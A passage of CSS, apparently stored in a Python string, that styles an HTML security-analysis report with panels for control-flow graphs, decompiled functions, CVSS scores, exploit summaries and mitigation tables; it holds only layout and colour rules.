.card-h .title{font-weight:650}.card-h .loc{color:var(--mut);font-size:12px;margin-left:auto;font-family:ui-monospace,monospace}
.card-h .chev{transition:transform .15s;color:var(--mut)}
.card[open] .card-h .chev{transform:rotate(90deg)}
.card-b{padding:2px 15px 16px;border-top:1px solid var(--line)}
.lg-en{display:none}
html[lang="en"] .lg-es{display:none}
html[lang="en"] .lg-en{display:block}
h4{margin:15px 0 5px;color:var(--mut);text-transform:uppercase;font-size:11px;letter-spacing:.05em}
pre{background:var(--code);border:1px solid var(--line);border-radius:8px;padding:11px;overflow:auto;font:12px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;color:var(--codefg);white-space:pre}
.sec{border:1px solid var(--line);border-radius:9px;margin:8px 0;background:var(--panel)}
.sec>summary{padding:10px 13px;cursor:pointer;font-weight:600;display:flex;justify-content:space-between;align-items:center;gap:10px}
.sec .src{color:var(--mut);font-weight:400;font-size:11px;font-family:ui-monospace,monospace}
.sec pre{margin:0 13px 13px}
.sechelp{margin:2px 13px 8px;color:var(--mut);font-size:12.5px;line-height:1.5;border-left:2px solid var(--acc);padding-left:9px}
.md{white-space:pre-wrap}
.evbox{border:1px solid var(--line);border-radius:9px;overflow:hidden;background:#0b0e12}
.evbar{display:flex;align-items:center;gap:8px;padding:8px 12px;background:#0e131c;border-bottom:1px solid #1e2632;font:11px ui-monospace,monospace;color:#8b95a1;flex-wrap:wrap}
.evdot{width:9px;height:9px;border-radius:50%}
.evlabel{color:#e2e8f0;font-weight:700;text-transform:uppercase;letter-spacing:.05em}
.evtag{color:#8b95a1}
.evchips{display:flex;gap:5px;flex-wrap:wrap;margin-left:auto}
.evsrc{background:#070a10;border:1px solid #1e2632;border-radius:5px;padding:1px 7px;color:#a9c7e8}
.evkind{color:#fff;font:700 9px sans-serif;padding:1px 6px;border-radius:4px;margin-left:6px;letter-spacing:.02em}
.evpre{margin:0;padding:12px;background:#0b0e12;color:#cfe3ff;white-space:pre;overflow:auto;font:12px/1.5 ui-monospace,monospace;border:0;border-radius:0}
.md code{background:var(--code);padding:1px 5px;border-radius:4px;font:12px ui-monospace,monospace;color:var(--codefg)}
.md ul,.md ol{margin:8px 0;padding-left:24px;white-space:normal}
.md li{margin:3px 0;white-space:normal}
.md p{white-space:normal}
.md strong{font-weight:700}
.md .tbl-wrap{overflow-x:auto;margin:12px 0;white-space:normal}
.md table{border-collapse:collapse;width:100%;font-size:13px}
.md th,.md td{border:1px solid var(--line);padding:6px 10px;text-align:left;vertical-align:top}
.md th{background:var(--code);font-weight:600}
.summary{margin-bottom:8px;border-left:3px solid var(--acc)}
.toc{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:14px 18px;margin:14px 0}
.toc-t{font-size:12px;color:var(--mut);text-transform:uppercase;letter-spacing:.04em;margin-bottom:8px}
ol.toc-l{margin:0;padding-left:20px;columns:2;column-gap:28px}
@media(max-width:600px){ol.toc-l{columns:1}}
ol.toc-l li{margin:3px 0}
ol.toc-l a{color:var(--acc);text-decoration:none}
ol.toc-l a:hover{text-decoration:underline}
html{scroll-behavior:smooth}
h2[id]{scroll-margin-top:16px}
.chain-t{font-weight:700;font-size:13px;line-height:1.4;margin:14px 0 6px;color:var(--fg)}
.chain-row{display:flex;flex-wrap:wrap;align-items:stretch;gap:0;margin-bottom:8px}
.chain-step{flex:1 1 150px;min-width:150px;border:1.5px solid var(--line);border-left-width:4px;
  border-radius:10px;background:var(--panel);padding:9px 11px}
.chain-n{font-weight:700;font-size:12.5px;color:var(--fg);margin-bottom:3px}
.chain-d{font-size:11.5px;line-height:1.45;color:var(--mut)}
.chain-arr{display:flex;align-items:center;padding:0 6px;color:var(--acc);font-size:20px;font-weight:700}
@media(max-width:640px){.chain-row{flex-direction:column}.chain-arr{transform:rotate(90deg);padding:4px 0;justify-content:center}}
.cfgflex{display:grid;grid-template-columns:1fr 260px;gap:12px}
@media(max-width:760px){.cfgflex{grid-template-columns:1fr}}
.cfginfo{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:12px;height:460px;overflow:auto}
.cfgi-a{font:700 12px ui-monospace,monospace;color:var(--acc);margin-bottom:6px}
.cfgi-code{background:var(--code);border-radius:7px;padding:8px;margin-bottom:8px}
.cfgi-l{font:11.5px/1.55 ui-monospace,monospace;color:var(--codefg);white-space:pre}
.cfgi-note{font-size:12.5px;line-height:1.5;color:var(--fg);border-left:2px solid var(--acc);padding-left:9px}
.cfgnode.sel rect{stroke:var(--acc);stroke-width:2.5}
.cfgwrap{border:1px solid var(--line);border-radius:12px;background:var(--panel);overflow:hidden;height:460px}
#cfgsvg{width:100%;height:100%;cursor:grab;background:
  radial-gradient(circle at 1px 1px, var(--line) 1px, transparent 0) 0 0/22px 22px}
#cfgsvg:active{cursor:grabbing}
.cfgnode rect{fill:var(--panel);stroke:var(--line);stroke-width:1.5;filter:drop-shadow(0 1px 2px rgba(0,0,0,.12))}
.cfgnode:hover rect{stroke:var(--acc)}
.cfgnode{cursor:move}
.cfgaddr{fill:var(--acc);font:700 11px ui-monospace,monospace}
.cfgins{fill:var(--codefg);font:11px/1 ui-monospace,monospace}
.cfg-lg{display:inline-flex;align-items:center;gap:4px;margin:0 8px}
.cfg-lg i{width:16px;height:3px;border-radius:2px;display:inline-block}
.cfg-reset{font-size:11px;padding:2px 8px;margin-left:6px}
#xgsvg{width:100%;height:100%;cursor:grab;background:
  radial-gradient(circle at 1px 1px, var(--line) 1px, transparent 0) 0 0/22px 22px}
#xgsvg:active{cursor:grabbing}
.xgnode{cursor:pointer}
.xgnode rect:first-of-type{fill:var(--panel);stroke-width:1.5;filter:drop-shadow(0 1px 2px rgba(0,0,0,.12))}
.xgnode:hover rect:first-of-type{stroke-width:2.5}
.xgnode.sel rect:first-of-type{stroke:var(--acc);stroke-width:2.5}
.xgnode.xgverified rect:first-of-type{stroke:#30a46c;stroke-width:2.5}
.xgok{fill:#30a46c;font:700 14px sans-serif}
.xgproof{border-left:3px solid #30a46c;background:color-mix(in srgb,#30a46c 8%,var(--panel));padding:8px 11px;border-radius:6px;margin:4px 0 8px}
.xgproof pre{max-height:180px;overflow:auto;margin:6px 0 0}
.xgnode.step rect:first-of-type{stroke-width:2.5}
.xgnode:not(.step) rect{opacity:1}
.xgt{fill:var(--fg);font:700 12px -apple-system,sans-serif}
.xgsub{fill:var(--mut);font:11px ui-monospace,monospace}
.xgmeta{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:6px 0 10px;font-size:12.5px}
@media(max-width:640px){.xgmeta{grid-template-columns:1fr}}
.xgbar{display:flex;flex-wrap:wrap;gap:6px;align-items:center;margin:8px 0}
.xgsp{flex:1}
.xgf{background:var(--panel);border:1px solid var(--line);color:var(--fg);border-radius:8px;
  padding:4px 10px;cursor:pointer;font-size:12px;display:inline-flex;align-items:center;gap:6px}
.xgf i{width:9px;height:9px;border-radius:50%;display:inline-block}
.xgf b{color:var(--mut)}
.xgf.xgon{border-color:var(--acc);background:color-mix(in srgb,var(--acc) 12%,var(--panel))}
.xg-lg{display:inline-flex;align-items:center;gap:4px;margin:0 7px}
.xg-lg i{width:11px;height:11px;border-radius:3px;display:inline-block}
.xgul{margin:4px 0;padding-left:16px}.xgul li{font-size:12px;line-height:1.5;margin:2px 0}
.xgcmp{width:100%;border-collapse:collapse;font-size:12.5px;margin:6px 0}
.xgcmp th,.xgcmp td{border:1px solid var(--line);padding:6px 9px;text-align:left}
.xgcmp th{background:var(--code);color:var(--mut);font-size:11px;text-transform:uppercase;letter-spacing:.03em}
.xgcmp code{background:var(--code);padding:1px 5px;border-radius:4px;color:var(--codefg)}
.xgcard{border:1px solid var(--line);border-radius:11px;margin:8px 0;background:var(--panel);padding:0 13px}
.xgcard>summary{cursor:pointer;padding:11px 0;list-style:none;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.xgcard>summary::-webkit-details-marker{display:none}
.xgbadge{color:#fff;font:700 10px sans-serif;padding:2px 7px;border-radius:5px;letter-spacing:.03em}
.xgscore{margin-left:auto;color:var(--mut);font-size:11.5px}
.xggrid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px 16px;padding:4px 0 10px}
@media(max-width:760px){.xggrid{grid-template-columns:1fr}}
.xgh{font:700 11px sans-serif;text-transform:uppercase;letter-spacing:.03em;color:var(--mut);margin-bottom:2px}
.xgsim{padding:8px 0;border-top:1px solid var(--line);font-size:12.5px}
.xgexp{margin:6px 0 12px}.xgexp>summary{cursor:pointer;font-size:12px;color:var(--acc)}
.mut{color:var(--mut)}
.deccmp{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px}
.deccol{border:1px solid var(--line);border-radius:9px;overflow:hidden;background:var(--code)}
.deccol-h{font:700 11px sans-serif;padding:6px 9px;background:var(--panel);border-bottom:1px solid var(--line);color:var(--acc)}
.deccol pre{margin:0;max-height:340px;overflow:auto}
.deccross{border-left:3px solid var(--acc);background:var(--code);padding:8px 11px;border-radius:6px;font-size:12.5px;margin:8px 0}
.dectech{width:100%;border-collapse:collapse;font-size:12px;margin:4px 0}
.dectech th,.dectech td{border:1px solid var(--line);padding:4px 8px;text-align:left}
.paylay{width:100%;border-collapse:collapse;font-size:12px;margin:4px 0}
.paylay th,.paylay td{border:1px solid var(--line);padding:5px 8px;text-align:left;vertical-align:top}
.paylay th{background:var(--code);color:var(--mut);font-size:11px;text-transform:uppercase}
.paylay tr.lrip td{background:color-mix(in srgb,#e5484d 8%,var(--panel))}
.dectech th{background:var(--code);color:var(--mut);font-size:11px;text-transform:uppercase}
.cvssb{color:#fff;font:700 10px ui-monospace,monospace;padding:2px 7px;border-radius:5px;letter-spacing:.02em}
.cvssbox{border:1px solid var(--line);border-radius:9px;padding:9px 11px;background:var(--code);margin:2px 0 4px}
.cvssrow{display:flex;align-items:center;gap:8px;font-size:13px;margin-bottom:5px}
.cvssmat{color:#fff;font:700 10px ui-monospace,monospace;padding:1px 6px;border-radius:4px}
.cvssvec{display:block;font:11.5px ui-monospace,monospace;color:var(--codefg);word-break:break-all}
.poc-note{color:var(--mut);font-size:12px;margin:-4px 0 12px}
.xpl-head{display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin:6px 0}
.xpl-prim{font-size:13px;margin:6px 0}
.xpl-conc{max-width:640px}
.xpl-conc th{width:170px;color:var(--mut);font-weight:600;text-transform:none}
.xpl-mit{margin:6px 0;padding-left:20px;font-size:13px}
.xpl-mit li{margin:3px 0}
div.xgverified{display:flex;align-items:center;gap:8px;flex-wrap:wrap;background:rgba(48,163,108,.10);border:1px solid #30a46c;border-radius:9px;padding:9px 12px;margin:10px 0;font-size:13px;color:var(--fg)}
div.xgverified .proof-ok{color:#30a46c;font-weight:700}
pre.pwnscript{background:#0b0e12;color:#cfe3ff;border:1px solid var(--line);border-radius:8px;padding:12px;overflow:auto;font:12px/1.5 ui-monospace,monospace;white-space:pre}
a.dlbtn{display:inline-block;background:#30a46c;color:#fff;text-decoration:none;border-radius:8px;padding:9px 16px;font-size:13px;font-weight:600}
a.dlbtn:hover{background:#278a59}
.decfn{border:1px solid var(--line);border-radius:11px;margin:10px 0;background:var(--panel);overflow:hidden}
.decfn-h{display:flex;align-items:center;gap:9px;padding:9px 13px;background:var(--code);border-bottom:1px solid var(--line)}
.decfn-t{font-weight:700;font-family:ui-monospace,monospace}
.decfn-e{color:var(--mut);font-size:11px;margin-left:auto;font-family:ui-monospace,monospace}
.decfn .md{padding:6px 15px 14px}
.decfn .md h4,.decfn .md h5{margin:13px 0 5px;color:var(--fg);text-transform:none;letter-spacing:0;font-size:13px}
.decfn .md p{margin:5px 0}
pre.code{background:#0b0e12;color:#cfe3ff;border:1px solid var(--line);border-radius:8px;padding:11px;overflow:auto;font:12px/1.5 ui-monospace,monospace;white-space:pre}
.decfn .sec{margin:8px 15px 14px}
.expwrap{display:grid;grid-template-columns:1fr 1fr;gap:14px}
@media(max-width:760px){.expwrap{grid-template-columns:1fr}}
.expcol{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:14px}
ol.steps{margin:6px 0 0;padding-left:20px}
ol.steps li{margin:0 0 9px;padding-left:4px}
ol.steps code{background:var(--code);padding:1px 5px;border-radius:4px;font:12px ui-monospace,monospace;color:var(--codefg)}
.mittab{width:100%;border-collapse:collapse;font-size:13px;background:var(--panel);border:1px solid var(--line);border-radius:12px;overflow:hidden}
.mittab th{text-align:left;padding:9px 12px;background:var(--code);color:var(--mut);font-size:11px;text-transform:uppercase;letter-spacing:.04em;border-bottom:1px solid var(--line)}
.mittab td{padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
.mittab tr:last-child td{border-bottom:0}
.mittab .mk{font-weight:700}
.mittab .mstate{font-weight:700;font-family:ui-monospace,monospace}
.mittab .mrem{color:var(--mut)}
.mitrow.ok .mstate{color:#2f9e5f}.mitrow.bad .mstate{color:#e5484d}.mitrow.warn .mstate{color:#e5a000}
.refchips{display:flex;flex-wrap:wrap;gap:8px}
.refchip{background:var(--code);border:1px solid var(--line);border-radius:7px;padding:5px 10px;color:var(--codefg);font:12px ui-monospace,monospace}
ul.reflist{margin:6px 0 0;padding-left:20px;color:var(--mut);font-size:13px}
.proof{border:1px solid #1f7a4d;border-radius:10px;overflow:hidden;background:#0b0e12;margin:10px 0;box-shadow:0 0 0 1px rgba(48,163,108,.15)}
.proof-h{display:flex;align-items:center;gap:9px;padding:9px 13px;background:#0e1a13;border-bottom:1px solid #1f7a4d;flex-wrap:wrap}
.proof-ok{color:#30d67f;font-weight:800}
.proof-t{color:#e2f5ea;font-weight:700}
.proof-l{color:#8b95a1;font-size:12px;margin-left:auto;font-family:ui-monospace,monospace}
.cmd{color:#7fe3a3;font-weight:600}
.empty{color:var(--mut);font-style:italic}
footer{margin-top:40px;padding-top:16px;border-top:1px solid var(--line);color:var(--mut);font-size:12px}
"""
